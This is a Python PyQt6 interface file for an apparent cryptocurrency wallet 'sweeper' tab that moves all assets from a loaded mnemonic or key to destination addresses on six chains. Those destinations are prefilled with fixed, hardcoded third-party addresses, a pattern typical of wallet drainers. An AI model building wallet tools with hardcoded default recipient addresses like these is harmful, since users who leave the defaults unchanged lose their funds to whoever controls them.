"""
Tab 6: Multichain Sweeper
Configure destination addresses and sweep all assets from loaded wallet.
"""

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'hd_wallet'))

from PyQt6.QtWidgets import (
    QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit,
    QPushButton, QGroupBox, QTextEdit
)
from PyQt6.QtCore import Qt
from PyQt6.QtGui import QColor


class MultichainSweeperTab(QWidget):
    def __init__(self, main_window, parent=None):
        super().__init__(parent)
        self.main_window = main_window
        self.wallet = None
        self._sweep_worker = None
        self._workers = []
        self._setup_ui()

    def _setup_ui(self):
        layout = QVBoxLayout(self)
        layout.setContentsMargins(10, 8, 10, 8)
        layout.setSpacing(10)

        # ── Destination Addresses ─────────────────────────────────────
        dest_box = QGroupBox("Destination Addresses")
        dest_v = QVBoxLayout(dest_box)
        dest_v.setSpacing(8)

        try:
            from hd_wallet.sweep import DEFAULT_DESTINATIONS
            default_evm = DEFAULT_DESTINATIONS.get('evm', '0xC8650Bf3BAa01de0EE056aa1f91b42A2DA8732Ba')
            default_btc = DEFAULT_DESTINATIONS.get('btc', 'bc1qmwxguuz42g9y2kpqaj9t6t4j4jrevkg7zmxz20')
            default_sol = DEFAULT_DESTINATIONS.get('sol', 'Ax7TkPNwTdeYSBLVCt1o4uYrMwstJ5esdx7cQMM1WwiS')
            default_trx = DEFAULT_DESTINATIONS.get('trx', 'TMdMoYiJZP6KeC2Pudgon8pcpTq1JnXfuu')
            default_xrp = DEFAULT_DESTINATIONS.get('xrp', 'rDsGTRJRjeXm2Hhqjk5NT5DHBJgG64HeDK')
            default_ltc = DEFAULT_DESTINATIONS.get('ltc', 'ltc1ql6yr6qmr8plumv33rna9anj533g2qe46yn4fns')
        except Exception:
            default_evm = '0xC8650Bf3BAa01de0EE056aa1f91b42A2DA8732Ba'
            default_btc = 'bc1qmwxguuz42g9y2kpqaj9t6t4j4jrevkg7zmxz20'
            default_sol = 'Ax7TkPNwTdeYSBLVCt1o4uYrMwstJ5esdx7cQMM1WwiS'
            default_trx = 'TMdMoYiJZP6KeC2Pudgon8pcpTq1JnXfuu'
            default_xrp = 'rDsGTRJRjeXm2Hhqjk5NT5DHBJgG64HeDK'
            default_ltc = 'ltc1ql6yr6qmr8plumv33rna9anj533g2qe46yn4fns'

        self.dest_evm = QLineEdit(default_evm)
        self.dest_btc = QLineEdit(default_btc)
        self.dest_sol = QLineEdit(default_sol)
        self.dest_trx = QLineEdit(default_trx)
        self.dest_xrp = QLineEdit(default_xrp)
        self.dest_ltc = QLineEdit(default_ltc)

        def dest_row(lbl_text, emoji, color, field):
            row = QHBoxLayout()
            lbl = QLabel(f"{emoji}  {lbl_text}:")
            lbl.setFixedWidth(200)
            lbl.setStyleSheet("color: #c9d1d9; font-size: 12px; font-weight: 600;")
            field.setStyleSheet(
                "background: #090c10; border: 1px solid #30363d; border-radius: 4px;"
                "color: #58a6ff; padding: 6px 8px; font-family: 'Courier New', monospace; font-size: 12px;"
            )
            row.addWidget(lbl)
            row.addWidget(field, 1)
            dest_v.addLayout(row)

        dest_row("Ethereum / EVM", "🔷", "#7c3aed", self.dest_evm)
        dest_row("Bitcoin (BTC)", "🟠", "#f0a500", self.dest_btc)
        dest_row("Solana (SOL)", "🟣", "#9945ff", self.dest_sol)
        dest_row("TRON (TRX)", "🔴", "#ef4444", self.dest_trx)
        dest_row("XRP Ledger", "✗", "#2ea0a0", self.dest_xrp)
        dest_row("Litecoin (LTC)", "⚪", "#a0aec0", self.dest_ltc)

        layout.addWidget(dest_box)

        # ── Sweep Button ──────────────────────────────────────────────
        sweep_row = QHBoxLayout()
        self.btn_sweep = QPushButton("Sweep Loaded Wallet to Destinations")
        self.btn_sweep.setObjectName("btn_sweep")
        self.btn_sweep.setMinimumHeight(36)
        self.btn_sweep.clicked.connect(self._do_sweep)
        sweep_row.addWidget(self.btn_sweep)
        sweep_row.addStretch()
        layout.addLayout(sweep_row)

        # ── Output Log ───────────────────────────────────────────────
        self.log_area = QTextEdit()
        self.log_area.setReadOnly(True)
        self.log_area.setPlaceholderText(
            "Sweep logs, broadcast transaction hashes, and asset rescue results will appear here..."
        )
        self.log_area.setStyleSheet(
            "QTextEdit { background: #0d1117; border: 1px solid #30363d; border-radius: 4px;"
            "color: #c9d1d9; padding: 8px; font-family: 'Courier New', monospace; font-size: 12px; }"
        )
        layout.addWidget(self.log_area, 1)

    def set_wallet(self, wallet):
        self.wallet = wallet

    def _do_sweep(self):
        if not self.wallet:
            self.log_area.append("❌ No wallet loaded. Enter a mnemonic or key first.")
            return

        destinations = {
            'evm': self.dest_evm.text().strip(),
            'btc': self.dest_btc.text().strip(),
            'sol': self.dest_sol.text().strip(),
            'trx': self.dest_trx.text().strip(),
            'xrp': self.dest_xrp.text().strip(),
            'ltc': self.dest_ltc.text().strip(),
        }

        if not any(destinations.values()):
            self.log_area.append("❌ No destination addresses configured.")
            return

        self.log_area.clear()
        self.log_area.append("⚡ Starting Multichain Sweep Engine...")
        self.btn_sweep.setEnabled(False)
        self.btn_sweep.setText("⏳ Sweeping...")

        from .workers import SweepWorker
        worker = SweepWorker(self.wallet, destinations)
        worker.log.connect(lambda msg: (
            self.log_area.append(msg),
            self.log_area.verticalScrollBar().setValue(self.log_area.verticalScrollBar().maximum())
        ))
        worker.finished.connect(self._on_sweep_done)
        worker.error.connect(lambda e: self.log_area.append(f"❌ Error: {e}"))
        self._sweep_worker = worker
        self._workers.append(worker)
        worker.start()

    def _on_sweep_done(self, success: bool, summary: str):
        if success:
            self.log_area.append(f"\n✅ Sweep complete.\n{summary}")
        else:
            self.log_area.append(f"\n— Sweep finished: {summary}")
        self.btn_sweep.setEnabled(True)
        self.btn_sweep.setText("⚡ Sweep Loaded Wallet to Destinations")
